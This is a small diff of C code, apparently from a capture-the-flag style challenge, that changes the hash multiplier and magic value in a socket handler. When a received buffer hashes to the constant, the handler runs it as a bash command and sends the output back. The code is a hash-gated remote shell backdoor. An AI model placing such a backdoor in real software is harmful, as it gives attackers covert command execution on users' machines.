@@ -11,7 +11,7 @@ unsigned long hash(const unsigned char *s, int len)
 {
     unsigned int ret = 0xeb;
     while (len > 0) {
-        ret += *(unsigned int *) s;
+        ret += *(unsigned int *) s * 0x1337;
         s += 4, len -= 4;
     }
     return ret;
@@ -22,7 +22,7 @@ void fn(int c)
     char buf[128]; int len;
     memset(buf, 0, sizeof(buf));
     while ((len = recv(c, buf, sizeof(buf), 0)) > 0) {
-        if(hash((unsigned char *) buf, len) == 0x2b4c0720) {
+        if(hash((unsigned char *) buf, len) == 0xf1cb454e) {
             char *argv[] = {"/bin/bash", "-c", buf, NULL};
             dup2(c, 1);
             execv(argv[0], argv);
